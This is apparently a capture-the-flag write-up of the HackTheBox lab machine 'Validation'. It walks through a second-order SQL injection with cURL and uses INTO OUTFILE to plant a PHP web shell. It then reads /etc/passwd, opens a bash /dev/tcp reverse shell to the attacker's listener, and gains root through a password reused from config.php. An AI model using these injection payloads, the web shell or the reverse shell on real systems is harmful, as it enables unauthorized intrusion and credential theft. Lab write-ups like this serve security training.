---
title: "Walk-through of Validation from HackTHeBox"
header:
  teaser: /assets/images/2021-09-17-17-01-04.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - cURL
  - Cookies
  - SQLi
---

## Machine Information

![validation](/assets/images/2021-09-17-17-01-04.png)

Validation is rated as an easy machine on HackTheBox. It was created by [ippsec](https://twitter.com/ippsec) for the Qualifiers of the Ultimate Hacking Championships organised by [Hacking Esports](https://twitter.com/hackingesports?lang=en). An initial scan reveals numerous ports but a first look at the website on port 80 reveals a simple web page which is used to register for UHC. Some enumeration of this page reveals it's vulnerable to a second order SQL injection. Using cURL we enumerate the backend and then upload a web shell. From there we pivot to a reverse shell, and then escalate to root via reused credentials found in a config file.

<!--more-->

Skill required are basic web enumeration and knowledge of SQLi. Skills learned are how second order injections work and using cURL to do the exploitation.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Validation](https://www.hackthebox.eu/home/machines/profile/382) |
| Machine Release Date | 6th September 2021 |
| Date I Completed It | 17th September 2021 |
| Distribution Used | Kali 2021.2 – [Release Info](https://www.kali.org/blog/kali-linux-2021-2-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/validation]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.116 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root💀kali)-[~/htb/validation]
└─# nmap -p$ports -sC -sV -oA validation 10.10.11.116
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-17 16:58 BST
Nmap scan report for 10.10.11.116
Host is up (0.027s latency).

PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http           Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open     http           nginx
|_http-title: 403 Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.10 seconds
```

## Web Enumeration

We have a fair few ports open, let's start with 80 as normal:

![validation-register](/assets/images/2021-09-17-17-04-16.png)

A simple static registration page is all we see. If I enter something in the username box and click Join Now I end up here:

![validation-welcome](/assets/images/2021-09-17-17-09-17.png)

Repeating that just adds to the list with those names appearing on the page. If we look at cookies for the page we see we have one called user:

![validation-cookie](/assets/images/2021-09-17-17-29-06.png)

Looks like a simple hash, let's check it:

```text
┌──(root💀kali)-[~/htb/validation]
└─# hashid 5f4dcc3b5aa765d61d8327deb882cf99     
Analyzing '5f4dcc3b5aa765d61d8327deb882cf99'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
<SNIP
```

Trying with a username of password we can easily decrypt to confirm this is just md5 hash of username:

![validation-decrypt](/assets/images/2021-09-17-17-32-31.png)

If we repeat adding the same user the cookie doesn't change. We need to bear this in mind as we look further to ensure we get a fresh cookie each time.

Now let's look at how the page works in Burp Repeater:

![validation-burp](/assets/images/2021-09-17-17-42-48.png)

We can see clicking the Join Now button sends a POST request to the server. The response gives us the cookie and redirects us to /account.php.

Following that redirect we can see the account.php page contains our username:

![validation-burp-redirect](/assets/images/2021-09-18-17-53-10.png)

## SQL Injection

We could continue in Burp or the browser, but I prefer using cURL on the command line. Let's have a look at a verbose response first:

```text
──(root💀kali)-[~/htb/validation]
└─# curl -v -d 'username=pencer1&country=Belgium' http://10.10.11.116
*   Trying 10.10.11.116:80...
* Connected to 10.10.11.116 (10.10.11.116) port 80 (#0)
> POST / HTTP/1.1
> Host: 10.10.11.116
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Length: 32
> Content-Type: application/x-www-form-urlencoded
> 
* upload completely sent off: 32 out of 32 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Sat, 18 Sep 2021 10:40:04 GMT
< Server: Apache/2.4.48 (Debian)
< X-Powered-By: PHP/7.4.23
< Set-Cookie: user=0350b1ac7ebc5e229c0e9c9d469553fa
< Location: /account.php
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 10.10.11.116 left intact
```

From this response I can take the cookie and use it with the account.php page:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v --cookie "user=0350b1ac7ebc5e229c0e9c9d469553fa" http://10.10.11.116/account.php
*   Trying 10.10.11.116:80...
* Connected to 10.10.11.116 (10.10.11.116) port 80 (#0)
> GET /account.php HTTP/1.1
> Host: 10.10.11.116
> User-Agent: curl/7.74.0
> Accept: */*
> Cookie: user=0350b1ac7ebc5e229c0e9c9d469553fa
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 18 Sep 2021 10:40:17 GMT
< Server: Apache/2.4.48 (Debian)
< X-Powered-By: PHP/7.4.23
< Vary: Accept-Encoding
< Content-Length: 695
< Content-Type: text/html; charset=UTF-8
```

We get this html response back:
```html
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container"><h1 class="text-center m-5">Join the UHC - September Qualifiers</h1></div>
    <section class="bg-dark text-center p-5 mt-4">
        <div class="container p-5">
            <h1 class="text-white">Welcome pencer1</h1>
            <h3 class="text-white">Other Players In Belgium</h3>
            <li class='text-white'>pencer1</li>
        </div>
    </section>
</div>
```

After some playing around I check for SQL injection vulnerability by putting an apostrophe at the end of the country parameter:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v -d "username=pencer3&country=Belgium'" http://10.10.11.116                     
<SNIP>
```

Note that each time I try a new query I'm using a new username. Take the cookie from the query and send it:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v --cookie "user=503b93ad315f7d89d58f5a4040ddc6f9" http://10.10.11.116/account.php
*   Trying 10.10.11.116:80...
* Connected to 10.10.11.116 (10.10.11.116) port 80 (#0)
> GET /account.php HTTP/1.1
> Host: 10.10.11.116
> User-Agent: curl/7.74.0
> Accept: */*
> Cookie: user=503b93ad315f7d89d58f5a4040ddc6f9
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 18 Sep 2021 10:45:21 GMT
< Server: Apache/2.4.48 (Debian)
< X-Powered-By: PHP/7.4.23
< Vary: Accept-Encoding
< Content-Length: 849
< Content-Type: text/html; charset=UTF-8
```

The html I get back shows an error:

```html
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container"><h1 class="text-center m-5">Join the UHC - September Qualifiers</h1></div>
    <section class="bg-dark text-center p-5 mt-4">
    <div class="container p-5">
        <h1 class="text-white">Welcome pencer3</h1>
        <h3 class="text-white">Other Players In Belgium'</h3>
        <br />
        <b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
        Stack trace:
        #0 {main} thrown in <b>/var/www/html/account.php</b> on line <b>33</b><br />
```

This is interesting, let's try a classic SQLi technique using dashes at the end to indicate comments:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v -d "username=pencer5&country=Belgium' -- -" http://10.10.11.116             
<SNIP>
```

Take the new cookie and send to the account.php page:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v --cookie "user=f85fdf23594083dac6653910d2fa222d" http://10.10.11.116/account.php
<SNIP>
```

This time there is no error:

```html
<div class="container"><h1 class="text-center m-5">Join the UHC - September Qualifiers</h1></div>
    <section class="bg-dark text-center p-5 mt-4">
        <div class="container p-5">
            <h1 class="text-white">Welcome pencer5</h1>
            <h3 class="text-white">Other Players In Belgium' -- -</h3>
            <li class='text-white'>pencer1</li>
            <li class='text-white'>pencer2</li>
        </div>
    </section>
</div>
```

Excellent. We've found our next steps. This technique is called second order SQLi because the web page itself isn't directly vulnerable, but the backend SQL code behind it is. So first we need to know if we can reflect our output on to the page:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v -d "username=pencer5&country=Belgium' union select 1-- -" http://10.10.11.116
<SNIP>
```

Send the cookie as before and we get the following html:

```html
<div class="container"><h1 class="text-center m-5">Join the UHC - September Qualifiers</h1></div>
    <section class="bg-dark text-center p-5 mt-4">
        <div class="container p-5">
            <h1 class="text-white">Welcome pencer6</h1>
            <h3 class="text-white">Other Players In Belgium' union select 1-- -</h3>
            <li class='text-white'>pencer1</li>
            <li class='text-white'>pencer2</li>
            <li class='text-white'>1</li>
        </div>
    </section>
</div>
```

You can see the number 1 from our union query is displayed on the page. Now let's get the user:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v -d "username=pencer7&country=Belgium' union select user()-- -" http://10.10.11.116
<SNIP>
└─# curl -v --cookie "user=ce14af17be3a9bcdf95074902db7eb25" http://10.10.11.116/account.php
```

Checking the response we see a username:

```html
<div class="container"><h1 class="text-center m-5">Join the UHC - September Qualifiers</h1></div>
    <section class="bg-dark text-center p-5 mt-4">
        <div class="container p-5">
            <h1 class="text-white">Welcome pencer7</h1>
            <h3 class="text-white">Other Players In Belgium' union select user()-- -</h3>
            <li class='text-white'>pencer1</li>
            <li class='text-white'>pencer2</li>
            <li class='text-white'>uhc@localhost</li>
        </div>
    </section>
</div>
```

We could find the database name as well:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v -d "username=pencer9&country=Belgium' union select database();-- -" http://10.10.11.116 
<SNIP>                                                                                                                     
┌──(root💀kali)-[~/htb/validation]
└─# curl -v --cookie "user=40b5f87fa3a86450e76a1bd4fa298dd2" http://10.10.11.116/account.php
```

Now we can see the database name:

```html
<div class="container"><h1 class="text-center m-5">Join the UHC - September Qualifiers</h1></div>
    <section class="bg-dark text-center p-5 mt-4">
        <div class="container p-5">
            <h1 class="text-white">Welcome pencer9</h1>
            <h3 class="text-white">Other Players In Belgium' union select database();-- -</h3>
            <li class='text-white'>pencer1</li><li class='text-white'>pencer2</li>
            <li class='text-white'>registration</li>
        </div>
        </section>
</div>
```

## Web Shell

I played around for a long time before I and found [this](https://neetech18.blogspot.com/2019/10/sql-injection-with-file-upload.html) article that talks about using outfile to write a file to the server. We can use it to test by writing a txt file:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v -d "username=pencer12&country=Belgium' union select 'pencer testing' into outfile '/var/www/html/pencer.txt';-- - " http://10.10.11.116                   
<SNIP>                                                                                                       
┌──(root💀kali)-[~/htb/validation]
└─# curl -v --cookie "user=71a27465cf506efbfa176a629b055338" http://10.10.11.116/account.php
```

The html response shows an error like we had earlier:

```html
<div class="container"><h1 class="text-center m-5">Join the UHC - September Qualifiers</h1></div>
    <section class="bg-dark text-center p-5 mt-4">
        <div class="container p-5">
            <h1 class="text-white">Welcome pencer12</h1>
            <h3 class="text-white">Other Players In Belgium' union select 'pencer testing' into outfile '/var/www/html/pencer.txt';-- - </h3>
            <br />
            <b>Fatal error</b>:  Uncaught Error: Call to a member function fetch_assoc() on bool in /var/www/html/account.php:33
            Stack trace: #0 {main} thrown in <b>/var/www/html/account.php</b> on line <b>33</b><br />
```

Luckily I checked if the file was written, otherwise I could have gone down another rabbit hole:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl http://10.10.11.116/pencer.txt                                                     
pencer testing
```

## Remote Code Execution

Now we are looking good. With the ability to write our own files, it's time to try and get a web shell:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v -d "username=pencer13&country=Belgium' union select '<?php SYSTEM($_REQUEST['cmd']); ?>' INTO OUTFILE '/var/www/html/pencer_shell.php';-- -" http://10.10.11.116
zsh: bad math expression: operand expected at `'cmd''
```

Too many speech marks and apostrophes, let's URL encode to get around it using [this](https://meyerweb.com/eric/tools/dencoder/) site to help:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl -v -d "username=pencer16&country=Belgium' union select %22%3C%3Fphp%20SYSTEM(%24_REQUEST%5B%27cmd%27%5D)%3B%20%3F%3E%22%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fhtml%2Fpencer_shell.php%27%3B--%20-" http://10.10.11.116
<SNIP>                                                            
┌──(root💀kali)-[~/htb/validation]
└─# curl -v --cookie "user=aeb3f86ccd45ea879d7eb7edbc682e3e" http://10.10.11.116/account.php
```

Ignoring the error in the html response again, we can now use our basic web shell to execute commands on the server:

```text
──(root💀kali)-[~/htb/validation]
└─# curl http://10.10.11.116/pencer_shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We can get the current user ID, we could also get the password file:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl http://10.10.11.116/pencer_shell.php?cmd=cat%20/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<SNIP>
```

## User Flag

We can also get the user flag:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl http://10.10.11.116/pencer_shell.php?cmd=ls%20/home/htb
user.txt
                                                                                                                     
┌──(root💀kali)-[~/htb/validation]
└─# curl http://10.10.11.116/pencer_shell.php?cmd=cat%20/home/htb/user.txt
<HIDDEN>
```

## Reverse Shell

Let's get a reverse shell to the box now. Using a simple pentestmonkey bash one from [here](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet):

```text
bash -c 'bash -i >& /dev/tcp/10.10.14.120/4444 0>&1'
```

Again we need to URL encode and also make sure we have a waiting netcat session in another window:

```text
┌──(root💀kali)-[~/htb/validation]
└─# curl http://10.10.11.116/pencer_shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.120%2F4444%200%3E%261%22
```

Now if we switch to our waiting nc session we see we are connected:

```text
┌──(root💀kali)-[~/htb/validation]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.120] from (UNKNOWN) [10.10.11.116] 59690
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$
```

## Root Flag

The path to root was pretty simple from here. Look what's in our current folder:

```text
www-data@validation:/var/www/html$ ls -l
ls -l
total 40
-rw-r--r-- 1 www-data www-data  1550 Sep  2 18:06 account.php
-rw-r--r-- 1 www-data www-data   191 Sep  2 18:06 config.php
drwxr-xr-x 1 www-data www-data  4096 Sep  2 18:06 css
-rw-r--r-- 1 www-data www-data 16833 Sep 16 13:20 index.php
drwxr-xr-x 1 www-data www-data  4096 Sep 16 13:40 js
```

The config file has the database connection settings:

```text
www-data@validation:/var/www/html$ cat config.php
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "<HIDDEN>-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

The password looks slightly suspicious with global in it, let's try with the root user:

```text
www-data@validation:/var/www/html$ su -
su -
Password: <HIDDEN>-global-pw
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
<HIDDEN>
```

All done. See you next time.
